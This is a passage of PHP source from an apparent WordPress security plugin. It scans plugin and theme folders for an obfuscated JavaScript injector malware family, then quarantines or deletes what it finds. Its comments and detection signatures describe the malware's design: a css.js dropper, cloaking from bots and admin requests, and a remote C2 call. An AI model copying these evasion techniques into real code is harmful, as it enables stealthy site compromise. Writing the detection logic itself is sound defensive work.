	 *   - The PHP file also injects a <script src="…css.js"> tag into every
	 *     front-end pageview by scanning the theme header for </head> or </body>
	 *     and inserting before it.
	 *   - Inside the JS: bot/crawler detection, URL filtering (skips wp-admin,
	 *     wp-login, static assets), and a JSON-RPC XHR call to a remote C2.
	 *     Human visitors receive the C2 payload silently; bots and admin requests
	 *     are passed through clean for stealth.
	 *
	 * Detection layer 1 (PHP dropper):
	 *   Scores up to 10 structural signals. 3+ = high; 6+ = critical + auto-delete.
	 *   Signals are co-occurrence-gated so a single innocent substring never fires.
	 *
	 * Detection layer 2 (planted css.js payload):
	 *   Checks the active and parent theme directories for a css.js file whose
	 *   content matches the RC4-obfuscator structural fingerprint.
	 *
	 * @return array<int, array<string, mixed>>
	 */
	private static function check_obfuscated_js_injector(): array {
		$found = [];

		// ── 1. Scan plugin directories for the PHP dropper ───────────────────

		if ( defined( 'WP_PLUGIN_DIR' ) && is_dir( WP_PLUGIN_DIR ) ) {
			$self_dir = realpath( WPS_DIR ) ?: '';
			try {
				$iter = new RecursiveIteratorIterator(
					new RecursiveDirectoryIterator( WP_PLUGIN_DIR, FilesystemIterator::SKIP_DOTS ),
					RecursiveIteratorIterator::LEAVES_ONLY
				);
				foreach ( $iter as $file ) {
					if ( ! ( $file instanceof SplFileInfo )
						|| ! self::is_php_executable( $file )
						|| ! $file->isReadable() ) {
						continue;
					}
					if ( $self_dir !== '' ) {
						$real = realpath( $file->getPathname() );
						if ( $real && ( $real === $self_dir || WPS_Utils::path_is_inside( $real, WPS_DIR ) ) ) {
							continue;
						}
					}
					// File-size gate: dropper is 40 KB–250 KB because of the embedded JS blob.
					// Legitimate plugin main files rarely exceed 50 KB.
					$size = $file->getSize();
					if ( $size < 40000 || $size > 250000 ) {
						continue;
					}

					$contents = @file_get_contents( $file->getPathname() );
					if ( ! is_string( $contents ) || $contents === '' ) {
						continue;
					}
					if ( self::is_whitelisted( $contents ) ) {
						continue;
					}

					// Score co-occurring structural signals.
					$score   = 0;
					$signals = [];

					if ( strpos( $contents, 'ENDPLUGINJS' ) !== false ) {
						$score++;
						$signals[] = 'ENDPLUGINJS heredoc terminator';
					}
					if ( strpos( $contents, '/css.js' ) !== false ) {
						$score++;
						$signals[] = "'/css.js' script delivery path";
					}
					if ( strpos( $contents, 'get_template_directory_uri()' ) !== false
						&& strpos( $contents, '/css.js' ) !== false ) {
						$score++;
						$signals[] = 'get_template_directory_uri() combined with css.js delivery';
					}
					if ( strpos( $contents, '_get_css_js_content' ) !== false ) {
						$score++;
						$signals[] = '_get_css_js_content function suffix';
					}
					if ( strpos( $contents, '_header_has_css_js_script' ) !== false ) {
						$score++;
						$signals[] = '_header_has_css_js_script injection guard';
					}
					if ( strpos( $contents, '_find_closing_tag_position' ) !== false ) {
						$score++;
						$signals[] = '_find_closing_tag_position injection helper';
					}
					// RC4-style obfuscator structural fingerprint inside the embedded JS blob.
					if ( strpos( $contents, 'while(!![]){try{' ) !== false
						|| strpos( $contents, 'while(!![]){try {' ) !== false ) {
						$score++;
						$signals[] = 'RC4-obfuscator string-rotation loop (while(!![]){try{)';
					}
					// Bot detection regex unique to this family (inside the JS blob).
					if ( strpos( $contents, 'mj12bot|semrush|facebookexternalhit' ) !== false ) {
						$score++;
						$signals[] = 'bot-filter regex (mj12bot|semrush|facebookexternalhit)';
					}
					// WP URL exclusion regex (inside the JS blob).
					if ( strpos( $contents, 'wp-login\\.php|wp-cron\\.php|xmlrpc\\.php' ) !== false ) {
						$score++;
						$signals[] = 'WordPress URL exclusion regex in embedded JS';
					}
					// Plugin header camouflage tell.
					if ( preg_match( '/Description:\s*simple\s+js\s+plugin/i', $contents ) ) {
						$score++;
						$signals[] = 'Plugin header "Description: simple js plugin" camouflage';
					}
					// IB<8hex>_PLUGIN_VERSION constant naming convention.
					if ( preg_match( "/define\s*\(\s*'IB[0-9a-f]{8}_PLUGIN_VERSION'/i", $contents ) ) {
						$score++;
						$signals[] = 'IB<8hex>_PLUGIN_VERSION constant (family naming convention)';
					}

					if ( $score < 3 ) {
						continue;
					}

					$is_critical = $score >= 6;
					$plugin_dir  = self::get_plugin_folder( $file->getPathname() );

					$found[] = [
						'severity'    => $is_critical ? 'critical' : 'high',
						'type'        => 'Obfuscated JS injector / theme-css.js dropper (' . $score . '/11 structural signals)',
						'subject'     => $file->getFilename() . ' (' . $score . '/11 signals)',
						'path'        => $file->getPathname(),
						'action'      => 'This plugin file carries ' . $score . ' structural signals of the theme-css.js obfuscated JS injector family. '
							. 'Matched: ' . implode( '; ', $signals ) . '. '
							. 'The dropper embeds ~130 KB of RC4-obfuscated JavaScript in a PHP heredoc (ENDPLUGINJS), '
							. 'writes it to the active theme directory as css.js, and injects a <script> tag into every '
							. 'front-end pageview. Human visitors silently receive a remote JSON-RPC payload; bots and '
							. 'WordPress admin/cron/asset requests are bypassed for stealth. '
							. 'Delete the plugin folder immediately. Also check your active and parent theme directories '
							. 'for a planted css.js file and delete it — WP Perf Shield will flag it separately if still present.',
						'match'       => implode( ' | ', $signals ),
						'auto_delete' => $is_critical,
						'delete_path' => $is_critical ? $plugin_dir : '',
					];
					WPS_Logger::log_event( 'obfuscated_js_injector_dropper', 'path=' . $file->getPathname() . ' score=' . $score );
				}
			} catch ( \Exception $e ) {
				WPS_Logger::write( 'check_obfuscated_js_injector plugin scan error: ' . $e->getMessage() );
			}
		}

		// ── 2. Scan active and parent theme directories for the planted css.js ─

		$theme_dirs = [];
		if ( function_exists( 'get_stylesheet_directory' ) ) {
			$theme_dirs[] = get_stylesheet_directory();
		}
		if ( function_exists( 'get_template_directory' ) ) {
			$parent = get_template_directory();
			if ( ! in_array( $parent, $theme_dirs, true ) ) {
				$theme_dirs[] = $parent;
			}
		}

		foreach ( $theme_dirs as $theme_dir ) {
			if ( ! is_dir( $theme_dir ) ) {
				continue;
			}
			$css_js = $theme_dir . DIRECTORY_SEPARATOR . 'css.js';
			if ( ! is_file( $css_js ) || ! is_readable( $css_js ) ) {
				continue;
			}

			$size = (int) @filesize( $css_js );
			// A legitimate css.js in a theme will not be 100 KB of obfuscated code.
			if ( $size < 40000 ) {
				continue;
			}

			$js_contents = @file_get_contents( $css_js );
			if ( ! is_string( $js_contents ) || $js_contents === '' ) {
				continue;
			}

			$js_score   = 0;
			$js_signals = [];

			if ( strpos( $js_contents, '(function(_0x' ) !== false ) {
				$js_score++;
				$js_signals[] = 'obfuscator IIFE opening (function(_0x…)';
			}
			if ( strpos( $js_contents, 'while(!![]){try{' ) !== false
				|| strpos( $js_contents, 'while(!![]){try {' ) !== false ) {
				$js_score++;
				$js_signals[] = 'RC4-obfuscator string-rotation loop (while(!![]){try{)';
			}
			if ( strpos( $js_contents, 'mj12bot|semrush|facebookexternalhit' ) !== false ) {
				$js_score++;
				$js_signals[] = 'bot-filter regex (mj12bot|semrush|facebookexternalhit)';
			}
			if ( strpos( $js_contents, 'wp-login\\.php|wp-cron\\.php|xmlrpc\\.php' ) !== false ) {
				$js_score++;
				$js_signals[] = 'WordPress URL exclusion regex';
			}
			if ( strpos( $js_contents, 'XMLHttpRequest' ) !== false
				&& strpos( $js_contents, 'jsonrpc' ) !== false ) {
				$js_score++;
				$js_signals[] = 'JSON-RPC XHR call';
			}
			// RC4 string-table deobfuscation function name pattern common to this obfuscator build.
			if ( preg_match( '/\ba0_0x[0-9a-f]+\b/', $js_contents ) ) {
				$js_score++;
				$js_signals[] = 'a0_0x family deobfuscation function (RC4 string table)';
			}

			if ( $js_score < 2 ) {
				continue;
			}

			$is_critical = $js_score >= 4;
			$css_action  = 'A css.js file (' . size_format( $size ) . ') was found in the theme directory '
				. basename( $theme_dir ) . ' with ' . $js_score . ' structural signals of the obfuscated JS injector payload. '
				. 'Matched: ' . implode( '; ', $js_signals ) . '. '
				. 'This resembles the RC4-obfuscated JavaScript payload written by the theme-css.js dropper plugin. '
				. 'Legitimate themes do not usually ship a css.js file of this size or structure. ';
			$css_action .= $is_critical
				? 'Delete this file immediately, then find and delete the plugin that planted it.'
				: 'Review this file before deleting; the score is below the automatic-deletion threshold.';

			$found[] = [
				'severity'    => $is_critical ? 'critical' : 'high',
				'type'        => 'Planted css.js payload in theme directory (' . $js_score . '/6 signals)',
				'subject'     => 'css.js in ' . basename( $theme_dir ),
				'path'        => $css_js,
				'action'      => $css_action,
				'match'       => 'css.js in theme: ' . implode( ' | ', $js_signals ),
				'auto_delete' => $is_critical,
				'delete_path' => $is_critical ? $css_js : '',
			];
			WPS_Logger::log_event( 'obfuscated_js_injector_payload', 'path=' . $css_js . ' score=' . $js_score . ' size=' . $size );
		}

		return $found;
	}

	//  Auto-remediation helpers 

	private static function auto_delete_enabled(): bool {
		$settings = get_option( WPS_OPTION, [] );
		return ! is_array( $settings ) || ( $settings['auto_delete_enabled'] ?? '1' ) !== '0';
	}

	/**
	 * 1.3.94: quarantine-first remediation (default on). When enabled, confirmed
	 * threats are moved to the recoverable, hardened store instead of being
	 * destroyed. Set to '0' to fall back to hard delete.
	 */
	public static function quarantine_enabled(): bool {
		$settings = get_option( WPS_OPTION, [] );
		return ! is_array( $settings ) || ( $settings['quarantine_enabled'] ?? '1' ) !== '0';
	}

	private static function mark_auto_delete_disabled( array &$findings ): void {
		$logged = [];
		foreach ( $findings as &$f ) {
			if ( empty( $f['auto_delete'] ) || empty( $f['delete_path'] ) ) {
				continue;
			}
			$f['auto_delete_skipped'] = true;
			$f['action'] .= ' Auto-delete is disabled in WP Perf Shield settings.';

			// Distinct log label for the detect-only state. De-duplicate per
			// path because a single scan can repeat the same delete_path.
			$path = (string) $f['delete_path'];
			if ( ! isset( $logged[ $path ] ) ) {
				$logged[ $path ] = true;
				WPS_Logger::log_event(
					'auto_delete_skipped_disabled',
					self::format_auto_delete_log_subject( $f, $path, 'skipped_disabled' )
				);
			}
		}
		unset( $f );
	}

	private static function is_protected_auto_delete_path( string $target ): bool {
		$real = realpath( $target );
		if ( ! $real || ! is_file( $real ) ) {
			return false;
		}
		if ( ! function_exists( 'get_template_directory' ) || ! function_exists( 'get_stylesheet_directory' ) ) {
			return false;
		}

		$theme_dirs = array_values( array_unique( array_filter( array_map( 'realpath', [
			get_template_directory(),
			get_stylesheet_directory(),
		] ) ) ) );
		if ( empty( $theme_dirs ) ) {
			return false;
		}

		$protected = [
			'functions.php',
			'style.css',
			'index.php',
			'header.php',
			'footer.php',
			'sidebar.php',
			'comments.php',
			'single.php',
			'page.php',
			'archive.php',
			'home.php',
			'front-page.php',
			'404.php',
			'search.php',
			'singular.php',
		];
		if ( ! in_array( basename( $real ), $protected, true ) ) {
			return false;
		}

		foreach ( $theme_dirs as $dir ) {
			if ( $dir && WPS_Utils::path_is_inside( $real, $dir ) ) {
				return true;
			}
		}
		return false;
	}

	private static function auto_remediate( array &$findings ): void {
		// Track already-deleted paths to avoid double-delete confusion
		$deleted_paths = [];

		foreach ( $findings as &$f ) {
			if ( empty( $f['auto_delete'] ) || empty( $f['delete_path'] ) ) {
				continue;
			}

			$target = $f['delete_path'];
			if ( self::is_protected_auto_delete_path( (string) $target ) ) {
				$f['auto_delete_skipped'] = true;
				$f['action'] .= ' Auto-delete skipped: active theme critical files require surgical cleaning or restore from backup.';
				WPS_Logger::log_event(
					'auto_delete_skipped_protected_theme',
					self::format_auto_delete_log_subject( $f, (string) $target, 'skipped_protected_theme' )
				);
				continue;
			}

			// Skip if already deleted in this run
			foreach ( $deleted_paths as $done ) {
				if ( WPS_Utils::path_string_is_same_or_child( (string) $target, (string) $done ) ) {
					$f['remediated'] = true;
					$f['action']     = ' Auto-deleted by WP Perf Shield (parent folder removed)';
					WPS_Logger::log_event(
						'auto_delete_parent_handled',
						self::format_auto_delete_log_subject( $f, $target, 'parent_handled' )
					);
					continue 2;
				}
			}

			$success = false;
			// 1.3.42: capture file hashes BEFORE delete so we can detect a
			// byte-identical redrop on the next scan. Bounded for directories
			// (cap at 20 PHP files, skip files >200 KiB) so a legitimate
			// deletion of a large compromised plugin folder cannot blow up the
			// option size.
			$pre_hashes = self::compute_redrop_hashes( $target );

			// 1.3.94: quarantine-first. Move the threat into the hardened store
			// (reversible, preserves evidence) instead of destroying it. This also
			// neutralises threats delete_directory refuses  notably a kit at the
			// ABSPATH root, which is outside WP_CONTENT_DIR.
			//
			// 1.4.60 (CRIT-002): the fallback used to run whenever quarantine did
			// not succeed, for ANY reason, on the reasoning that a threat should
			// never be left live. That conflated two different situations.
			//
			// Quarantine DISABLED is a policy choice: the operator has said they
			// want removal, so removal is what they get.
			//
			// Quarantine FAILING is an accident - no disk space, a permissions
			// error, an unwritable store, a path the quarantine refused. None of
			// those is evidence that destroying the file is safe. The old
			// behaviour turned a recoverable incident into permanent data loss
			// precisely when the machine was already misbehaving, and it did so
			// most eagerly on the findings least likely to be right: a heuristic
			// match on a file the operator would have wanted back.
			//
			// A live threat left in place for one more scan is recoverable. A
			// legitimate file deleted because the quarantine directory was full
			// is not.
			$quarantined_id       = null;
			$quarantine_attempted = false;
			if ( self::quarantine_enabled() && class_exists( 'WPS_Quarantine' ) ) {
				$quarantine_attempted = true;
				$quarantined_id = WPS_Quarantine::quarantine(
					(string) $target,
					[
						'type'     => (string) ( $f['type'] ?? '' ),
						'severity' => (string) ( $f['severity'] ?? '' ),
						'subject'  => (string) ( $f['subject'] ?? '' ),
						'reason'   => 'auto-remediation: ' . (string) ( $f['type'] ?? 'confirmed threat' ),
					]
				);
				if ( $quarantined_id !== null ) {
					$success = true;
				}
			}

			if ( ! $success && $quarantine_attempted ) {
				// Quarantine was tried and did not work. Stop here: leave the
				// target untouched, keep the finding open, and say so loudly.
				$f['remediated']          = false;
				$f['remediation_failed']  = true;
				$f['quarantine_failed']   = true;
				$f['action'] = ( $f['action'] ?? '' )
					. ' AUTOMATIC REMEDIATION DID NOT RUN. Quarantine was attempted and failed, so WP Perf Shield '
					. 'left this file exactly as it is rather than deleting it - a quarantine failure means the '
					. 'machine is not behaving, not that destroying the file is safe. The threat is still live. '
					. 'Check that the quarantine store (' . self::display_path( WPS_Quarantine::store_dir() ) . ') exists, is writable and has free space, '
					. 'then remediate manually or re-run the scan.';
				WPS_Logger::log_event(
					'auto_remediation_withheld',
					self::format_auto_delete_log_subject( $f, $target, 'quarantine_failed_no_delete' )
				);
				WPS_Logger::write(
					'auto-remediation withheld (quarantine failed, deletion NOT attempted): ' . (string) $target
				);
				continue;
			}

			if ( ! $success ) {
				// Quarantine is switched off, so deletion is the remediation the
				// operator configured.
				if ( is_dir( $target ) ) {
					$success = self::delete_directory( $target );
				} elseif ( is_file( $target ) ) {
					$success = @unlink( $target );
				}
			}

			if ( $success ) {
				// 1.3.98: verify-then-report. A remediation call returning true is a
				// claim; the filesystem is the truth. If the target still exists
				// after a reported success - permissions race, immutable attribute,
				// or a re-dropper replanting within the same second - the finding
				// must say so instead of reporting a clean removal, and the path
				// must NOT join deleted_paths (children would be wrongly skipped as
				// parent-handled).
				clearstatcache( true, (string) $target );
				if ( file_exists( $target ) ) {
					$f['remediated']             = false;
					$f['remediation_unverified'] = true;
					$f['action'] = ( $f['action'] ?? '' ) . ' Removal reported success but the target STILL EXISTS on re-check. '
						. 'Either permissions silently blocked it or an active re-dropper replaced it immediately - '
						. 'treat this as a live re-dropper lead and run the Re-dropper hunt commands under Forensics.';
					WPS_Logger::log_event(
						'auto_delete_unverified',
						self::format_auto_delete_log_subject( $f, $target, 'unverified_still_exists' )
					);
					continue;
				}

				$f['remediated'] = true;
				if ( $quarantined_id !== null ) {
					$f['quarantined']    = $quarantined_id;
					$f['action']         = ' Quarantined by WP Perf Shield (moved to the recoverable store; restore or purge it under Quarantine).';
				} else {
					$f['action']         = ' Auto-deleted by WP Perf Shield';
				}
				$deleted_paths[] = $target;
				WPS_Logger::log_event(
					$quarantined_id !== null ? 'auto_quarantined' : 'auto_deleted',
					self::format_auto_delete_log_subject( $f, $target, 'deleted' )
				);
				self::record_redrop_baseline( $pre_hashes, $f );
				self::scrub_deleted_from_db( $target );
			} elseif ( ! file_exists( $target ) ) {
				// Already gone (deleted by a previous finding in this run, or by
				// some other process). Distinct log label so support can tell the
				// "deleted by us" case from "missing on disk before we tried".
				$f['remediated'] = true;
				$f['action']     = ' Auto-deleted by WP Perf Shield';
				WPS_Logger::log_event(
					'auto_delete_already_gone',
					self::format_auto_delete_log_subject( $f, $target, 'already_gone' )
				);
			} else {
				$f['action'] = ( $f['action'] ?? '' ) . '  Auto-delete failed  check file permissions.';
				WPS_Logger::log_event(
					'auto_delete_failed',
					self::format_auto_delete_log_subject( $f, $target, 'failed' )
				);
			}
		}
		unset( $f );
	}

	private static function format_auto_delete_log_subject( array $finding, string $target, string $result = 'deleted' ): string {
		$parts = [
			'result=' . $result,
			'path=' . $target,
			'type=' . ( $finding['type'] ?? 'unknown' ),
		];

		if ( ! empty( $finding['match'] ) ) {
			$parts[] = 'match=' . $finding['match'];
		}

		if ( ! empty( $finding['severity'] ) ) {
			$parts[] = 'severity=' . $finding['severity'];
		}

		return implode( ' | ', $parts );
	}

	private static function scrub_deleted_from_db( string $deleted_path ): void {
		$active          = get_option( 'active_plugins', [] );
		$real_plugin_dir = realpath( WP_PLUGIN_DIR );
		if ( ! is_array( $active ) || ! $real_plugin_dir ) {
			return;
		}
		$dirty = false;
		$deleted_norm = rtrim( str_replace( '\\', '/', $deleted_path ), '/' ) . '/';
		foreach ( $active as $k => $plugin_file ) {
			if ( ! is_string( $plugin_file ) ) continue;
			$abs = $real_plugin_dir . DIRECTORY_SEPARATOR . str_replace( '/', DIRECTORY_SEPARATOR, $plugin_file );
			$abs_norm = str_replace( '\\', '/', $abs );
			if ( strpos( $abs_norm, $deleted_norm ) === 0 || ! file_exists( WP_PLUGIN_DIR . '/' . $plugin_file ) ) {
				unset( $active[ $k ] );
				$dirty = true;
				WPS_Logger::log_event( 'auto_deactivated', $plugin_file );
			}
		}
		if ( $dirty ) {
			update_option( 'active_plugins', array_values( $active ) );
		}
	}

	private static function get_plugin_folder( string $file_path ): ?string {
		$real_plugin_dir = realpath( WP_PLUGIN_DIR );
		$real_file       = realpath( $file_path );
		if ( ! $real_plugin_dir || ! $real_file ) {
			return null;
		}
		if ( ! self::path_is_inside( $real_file, WP_PLUGIN_DIR ) ) {
			return null;
		}
		$relative = substr( $real_file, strlen( $real_plugin_dir ) + 1 );
		$parts    = explode( DIRECTORY_SEPARATOR, $relative );
		return $real_plugin_dir . DIRECTORY_SEPARATOR . $parts[0];
	}

	private static function delete_directory( string $dir ): bool {
		if ( ! is_dir( $dir ) ) {
			return false;
		}
		$real = realpath( $dir );
		if ( ! $real || $real === realpath( WP_CONTENT_DIR ) || ! self::path_is_inside( $real, WP_CONTENT_DIR ) ) {
			return false;
		}
		try {
			$iter = new RecursiveIteratorIterator(
				new RecursiveDirectoryIterator( $dir, FilesystemIterator::SKIP_DOTS ),
				RecursiveIteratorIterator::CHILD_FIRST
			);
			foreach ( $iter as $item ) {
				if ( $item->isDir() ) {
					@rmdir( $item->getPathname() );
				} else {
					@unlink( $item->getPathname() );
				}
			}
			return @rmdir( $dir );
		} catch ( \Exception $e ) {
			WPS_Logger::write( 'Delete error: ' . $e->getMessage() );
			return false;
		}
	}

	private static function path_is_inside( string $child, string $parent ): bool {
		$child_real  = realpath( $child );
		$parent_real = realpath( $parent );

		if ( ! $child_real || ! $parent_real ) {
			return false;
		}

		$child_norm  = str_replace( '\\', '/', $child_real );
		$parent_norm = rtrim( str_replace( '\\', '/', $parent_real ), '/' ) . '/';

		return strpos( $child_norm . ( is_dir( $child_real ) ? '/' : '' ), $parent_norm ) === 0;
	}

	/**
	 * Check whether a file's contents match a whitelisted SHA-256 hash.
	 *
	 * Returns true if the file is on the verified-clean list. The signature
	 * scan should short-circuit and return no finding for whitelisted files.
	 *
	 * Whitelist hits are logged so an operator reviewing the security log
	 * can verify which files were skipped and why.
	 *
	 * @param string $contents Raw file contents already read into memory.
	 */
	private static function is_whitelisted( string $contents ): bool {
		if ( $contents === '' ) return false;
		$hash = hash( 'sha256', $contents );
		if ( isset( self::WHITELIST_HASHES[ $hash ] ) ) {
			WPS_Logger::write( sprintf(
				'Whitelist hit: %s (sha256=%s)',
				self::WHITELIST_HASHES[ $hash ],
				$hash
			) );
			return true;
		}
		return false;
	}

	/**
	 * Normalise an absolute path to a forward-slash path relative to wp-content/.
	 *
	 * Returns '' if the path lies outside wp-content/ or cannot be resolved.
	 * Used as the lookup key for WHITELIST_PATH_SIG.
	 */
	/**
	 * 1.4.25: a path to show the operator, for findings anywhere on the site.
	 *
	 * normalize_relative_path() deliberately returns an empty string outside
	 * wp-content, which is correct for its original callers and wrong for the
	 * root-level checks added in 1.4.25 - a hijacked index.php at the site
	 * root reported itself with no subject at all.
	 */
	private static function display_path( string $abs_path ): string {
		$rel = self::normalize_relative_path( $abs_path );
		if ( '' !== $rel ) {
			return 'wp-content/' . $rel;
		}
		$root = realpath( ABSPATH ) ?: rtrim( ABSPATH, '/\\' );
		$real = realpath( $abs_path ) ?: $abs_path;
		$root = str_replace( '\\', '/', rtrim( $root, '/\\' ) );
		$real = str_replace( '\\', '/', $real );
		if ( strpos( $real, $root . '/' ) === 0 ) {
			return substr( $real, strlen( $root ) + 1 );
		}
		return basename( $abs_path );
	}

	private static function normalize_relative_path( string $abs_path ): string {
		if ( $abs_path === '' || ! defined( 'WP_CONTENT_DIR' ) ) return '';

		$content_real = realpath( WP_CONTENT_DIR );
		$file_real    = realpath( $abs_path );
		if ( $content_real === false || $file_real === false ) {
			$content_real = WP_CONTENT_DIR;
			$file_real    = $abs_path;
		}

		$content_real = str_replace( '\\', '/', rtrim( $content_real, '/\\' ) );
		$file_real    = str_replace( '\\', '/', $file_real );

		if ( strpos( $file_real, $content_real . '/' ) === 0 ) {
			return substr( $file_real, strlen( $content_real ) + 1 );
		}
		return '';
	}

	/**
	 * Check whether a (file_path, signature) pair is whitelisted (added v1.2.1).
	 *
	 * Returns true if the file is on the path-signature whitelist for the
	 * specific signature that just matched. The caller should suppress that
	 * one match and keep scanning the file against remaining signatures so
	 * unrelated malware artefacts in the same file still fire normally.
	 *
	 * Whitelist hits are written to the security log for audit.
	 *
	 * @param string $abs_path Absolute filesystem path of the file scanned.
	 * @param string $sig      The signature substring that just matched.
	 */
	private static function is_whitelisted_match( string $abs_path, string $sig ): bool {
		$rel = self::normalize_relative_path( $abs_path );
		if ( $rel === '' ) return false;

		if ( ! isset( self::WHITELIST_PATH_SIG[ $rel ] ) ) return false;

		if ( in_array( $sig, self::WHITELIST_PATH_SIG[ $rel ], true ) ) {
			WPS_Logger::write( sprintf(
				'Whitelist hit (path+sig): %s allows %s',
				$rel,
				$sig
			) );
			return true;
		}
		return false;
	}

	/** Map a signature string to its malware family label. */
	private static function sig_family( string $sig ): string {
		if ( in_array( $sig, self::SIGNATURES_ANTY, true ) ) {
			return 'WP-antymalwary-bot family';
		}
		if ( in_array( $sig, self::SIGNATURES_BACKDOOR, true ) ) {
			return 'PHP backdoor/RAT (class-wp-compat family)';
		}
		return 'wp-perf-analytics ClickFix family';
	}
}
